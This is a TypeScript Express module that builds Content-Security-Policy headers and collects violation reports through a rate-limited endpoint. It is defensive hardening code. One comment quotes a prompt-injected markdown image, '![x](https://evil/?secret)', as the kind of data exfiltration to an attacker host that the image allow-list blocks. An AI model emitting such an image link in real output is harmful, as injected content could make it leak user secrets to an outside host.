import type { NextFunction, Request, RequestHandler, Response } from "express";
import express from "express";
import { logger } from "../observability/logger.js";

/**
 * Content-Security-Policy: one place that builds the policy for each surface, sends it, and collects violation reports.
 *
 * Goals, in order: (1) no script can run unless it comes from this origin (no inline script, no eval, no third-party hosts),
 * (2) nothing can be loaded from or sent to an arbitrary host, (3) every violation is visible to the operator.
 *
 * What the policy deliberately does NOT remove (each is documented in SECURITY.md):
 *   - style-src-attr 'unsafe-inline'  inline style="..." attributes. The UI builds markup with style attributes in many places;
 *                                      style attributes cannot run script, and style ELEMENTS stay restricted to 'self'.
 *   - img-src allow-list               remote images are a feature (README badges, avatars). Instead of every https: host, only
 *                                      well-known image hosts are allowed (CSP_IMG_EXTRA adds more, CSP_IMG_ALLOW_ALL=true
 *                                      restores https:). Anything else - a prompt-injected "![x](https://evil/?secret)" - is blocked.
 *   - Classic app: https://accounts.google.com/gsi/* (Google Sign-In, exact paths only). Its in-page code playground used eval();
 *     that fallback now shows a message instead, and 'unsafe-eval' is only added if CSP_CLASSIC_ALLOW_EVAL=true.
 */
export type CspSurface = "app" | "classic";

const DEFAULT_IMG_HOSTS = [
  "https://raw.githubusercontent.com",
  "https://github.com",
  "https://avatars.githubusercontent.com",
  "https://user-images.githubusercontent.com",
  "https://camo.githubusercontent.com",
  "https://img.shields.io",
  "https://lh3.googleusercontent.com",
];

const list2 = (name: string): string[] => (process.env[name] || "").split(/[\s,]+/).filter(Boolean);
const list = (name: string): string[] => (process.env[name] || "").split(/[\s,]+/).filter((v) => /^(https?:\/\/[^\s;,'"]+|wss?:\/\/[^\s;,'"]+)$/.test(v));

/**
 * Google's sign-in script (loaded by the Classic app) injects one inline <style> element of its own (class names like .qJTHM; it hides
 * helper nodes off-screen and styles the One Tap prompt). Instead of allowing every inline style element, that exact block is
 * allow-listed by hash. If Google ever changes the text the hash stops matching: the browser's console message prints the new
 * hash ("... or a hash ('sha256-...')"), add it with CSP_CLASSIC_STYLE_HASHES; CSP_CLASSIC_STYLE_INLINE=true is the coarse fallback.
 */
export const GSI_STYLE_HASH = "'sha256-RU4sU0AaS8IBGZx8XrGt/pa9A5SLA3dQszGeqT5L3Kw='";

/**
 * Violation reports use the classic `report-uri` directive ONLY. Tested in Chrome: report-uri posts immediately, but when `report-to`
 * is also present Chrome ignores report-uri and delivers through the Reporting API instead, which only works over HTTPS with a
 * reachable endpoint and batches for up to a minute. Firefox and Safari only support report-uri. parseReports() still understands
 * both payload formats, so adding `report-to` later needs no server change.
 */
export const REPORT_PATH = "/api/csp-report";

export function buildCsp(surface: CspSurface = "app"): string {
  const connectExtra = list("CSP_CONNECT_EXTRA");
  const imgSources = (process.env.CSP_IMG_ALLOW_ALL || "").toLowerCase() === "true" ? ["https:"] : [...DEFAULT_IMG_HOSTS, ...list("CSP_IMG_EXTRA")];
  // Google Sign-In (Classic app only), limited to the exact paths Google documents for it, not the whole accounts.google.com origin.
  const gsi = surface === "classic";
  const hashes = list2("CSP_CLASSIC_STYLE_HASHES").filter((h) => /^'sha(256|384|512)-[A-Za-z0-9+/=]+'$/.test(h));
  const styleElem = ["'self'", ...(gsi ? ["https://accounts.google.com/gsi/style", GSI_STYLE_HASH, ...hashes] : []), ...(gsi && (process.env.CSP_CLASSIC_STYLE_INLINE || "").toLowerCase() === "true" ? ["'unsafe-inline'"] : []), "'report-sample'"];
  const evalAllowed = surface === "classic" && (process.env.CSP_CLASSIC_ALLOW_EVAL || "false").toLowerCase() === "true";

  const directives: Array<[string, string[]]> = [
    ["default-src", ["'self'"]],
    ["script-src", ["'self'", "'report-sample'", ...(gsi ? ["https://accounts.google.com/gsi/client"] : []), ...(evalAllowed ? ["'unsafe-eval'"] : [])]],
    ["script-src-attr", ["'none'"]], // inline event handlers (onclick=...) never run
    ["style-src", styleElem],
    ["style-src-elem", styleElem],
    ["style-src-attr", ["'unsafe-inline'"]],
    ["img-src", ["'self'", "data:", "blob:", ...imgSources]],
    ["font-src", ["'self'", "data:"]],
    ["connect-src", ["'self'", ...(gsi ? ["https://accounts.google.com/gsi/"] : []), ...connectExtra]],
    ["media-src", ["'self'", "blob:", "data:"]],
    ["frame-src", ["'self'", "blob:", ...(gsi ? ["https://accounts.google.com/gsi/"] : [])]],
    ["worker-src", ["'self'", "blob:"]],
    ["manifest-src", ["'self'"]],
    ["object-src", ["'none'"]],
    ["base-uri", ["'self'"]],
    ["form-action", ["'self'"]],
    ["frame-ancestors", ["'self'"]],
  ];
  if ((process.env.CSP_UPGRADE_INSECURE || "").toLowerCase() === "true") directives.push(["upgrade-insecure-requests", []]);
  directives.push(["report-uri", [REPORT_PATH]]);
  return directives.map(([name, values]) => (values.length ? `${name} ${values.join(" ")}` : name)).join("; ");
}

export type CspMode = "enforce" | "report-only" | "off";
/**
 * Enforced in production. In development (NODE_ENV not "production") the default is report-only: `npm run dev` serves the UI through
 * Vite's middleware, which injects an inline React-refresh script, a hot-reload websocket and inline styles, all of which the enforced
 * policy blocks (the UI then fails with "plugin-react can't detect preamble"). Violations are still reported in the console. Setting
 * PRIVACY_CSP explicitly always wins, and an unknown value fails closed to enforce.
 */
export function cspMode(): CspMode {
  const raw = process.env.PRIVACY_CSP;
  const m = (raw || (process.env.NODE_ENV === "production" ? "enforce" : "report-only")).toLowerCase();
  return m === "report-only" || m === "off" ? m : "enforce";
}

/** Sets the policy (or its report-only twin) and the reporting endpoint on a response. */
export function applyCspHeaders(req: Request, res: Response): void {
  const mode = cspMode();
  if (mode === "off") return;
  const surface: CspSurface = req.path.startsWith("/classic") ? "classic" : "app";
  res.setHeader(mode === "enforce" ? "Content-Security-Policy" : "Content-Security-Policy-Report-Only", buildCsp(surface));
}

// ------------------------------------------------------------------------------------------------ violation reports

export interface Violation {
  directive: string;
  blocked: string;
  document: string;
  source?: string;
  line?: number;
  disposition: string;
  sample?: string;
}

/** Keep only origin + path of a URL: query strings and fragments can carry tokens or user content. */
export function safeUrl(u: unknown): string {
  const s = String(u ?? "");
  if (!s) return "";
  if (/^(inline|eval|data|blob|about|wasm-eval|trusted-types-policy|trusted-types-sink)/i.test(s)) return s.split(/[:;,]/)[0].toLowerCase();
  try {
    const x = new URL(s, "http://self.invalid");
    const host = x.host === "self.invalid" ? "" : `${x.protocol}//${x.host}`;
    return (host + x.pathname).slice(0, 200);
  } catch {
    return s.split(/[?#]/)[0].slice(0, 200);
  }
}

/** Normalise both report formats (legacy `csp-report` object, and Reporting API array) into Violation records. */
export function parseReports(body: unknown): Violation[] {
  const items: any[] = Array.isArray(body) ? body : body && typeof body === "object" ? [body] : [];
  const out: Violation[] = [];
  for (const item of items.slice(0, 10)) {
    const r = item?.["csp-report"] ?? (item?.type === "csp-violation" ? item.body : null);
    if (!r || typeof r !== "object") continue;
    const directive = String(r["effective-directive"] || r.effectiveDirective || r["violated-directive"] || r.violatedDirective || "unknown").split(" ")[0].slice(0, 40);
    out.push({
      directive,
      blocked: safeUrl(r["blocked-uri"] ?? r.blockedURL ?? r.blockedURI),
      document: safeUrl(r["document-uri"] ?? r.documentURL ?? r.documentURI),
      source: safeUrl(r["source-file"] ?? r.sourceFile) || undefined,
      line: Number(r["line-number"] ?? r.lineNumber) || undefined,
      disposition: String(r.disposition || "enforce").slice(0, 12),
      sample: String(r["script-sample"] ?? r.sample ?? "").slice(0, 80) || undefined,
    });
  }
  return out;
}

/**
 * Reports that are expected and already handled. Mermaid builds each diagram's theme CSS as a <style> element inside the SVG it is
 * measuring; the policy blocks that element (it has no effect), and web/js/lib/markdown.js then re-applies the same rules through the
 * CSSOM, so diagrams look right. Every diagram render therefore produces exactly one such report. They are still counted (see
 * cspViolationStats) but logged at debug level so they cannot bury real violations.
 */
export function knownBenignReason(v: Violation): string | null {
  if (v.directive === "style-src-elem" && v.blocked === "inline" && v.sample && /^#d?mermaid[\w-]*\s*\{/.test(v.sample)) return "mermaid-theme-css";
  return null;
}

const stats = new Map<string, { count: number; first: number; last: number }>();
let windowStart = 0;
let windowCount = 0;

export function cspViolationStats(): Array<{ key: string; count: number }> {
  return [...stats.entries()].map(([key, v]) => ({ key, count: v.count })).sort((a, b) => b.count - a.count);
}
export function resetCspViolationStats(): void {
  stats.clear();
  windowStart = 0;
  windowCount = 0;
}

/**
 * POST /api/csp-report. Public (browsers send reports without credentials), so it is defended instead: tiny body limit,
 * the global rate limit, at most 120 log lines per minute, bounded memory, always answers 204 and never echoes input.
 */
export function cspReportRoutes(app: express.Express): void {
  const parse = express.json({ type: ["application/json", "application/csp-report", "application/reports+json"], limit: "16kb" });
  // A body that is not valid JSON is still "a report we do not understand": answer 204 instead of letting Express print a stack trace.
  const tolerantParse: RequestHandler = (req, res, next) =>
    parse(req, res, (err?: any) => {
      if (!err) return next();
      res.status(err.status === 413 || err.type === "entity.too.large" ? 413 : 204).end();
    });
  app.post(REPORT_PATH, tolerantParse, (req: Request, res: Response) => {
    try {
      const now = Date.now();
      if (now - windowStart > 60_000) { windowStart = now; windowCount = 0; }
      for (const v of parseReports(req.body)) {
        const benign = knownBenignReason(v);
        const key = `${v.directive} <- ${v.blocked || "(none)"}${benign ? ` [known: ${benign}]` : ""}`;
        const s = stats.get(key);
        if (s) { s.count++; s.last = now; } else if (stats.size < 500) stats.set(key, { count: 1, first: now, last: now });
        if (benign) { logger.debug("csp_violation_known", { reason: benign, directive: v.directive, document: v.document }); continue; }
        if (++windowCount <= 120) logger.warn("csp_violation", { directive: v.directive, blocked: v.blocked, document: v.document, source: v.source, line: v.line, disposition: v.disposition, sample: v.sample });
      }
    } catch { /* a malformed report is not worth an error */ }
    res.status(204).end();
  });
  // Anything else on this path is not a report.
  app.all(REPORT_PATH, (_req: Request, res: Response) => res.status(405).set("Allow", "POST").json({ error: "Method not allowed" }));
}

export const cspHeadersMiddleware: RequestHandler = (req: Request, res: Response, next: NextFunction) => {
  applyCspHeaders(req, res);
  next();
};
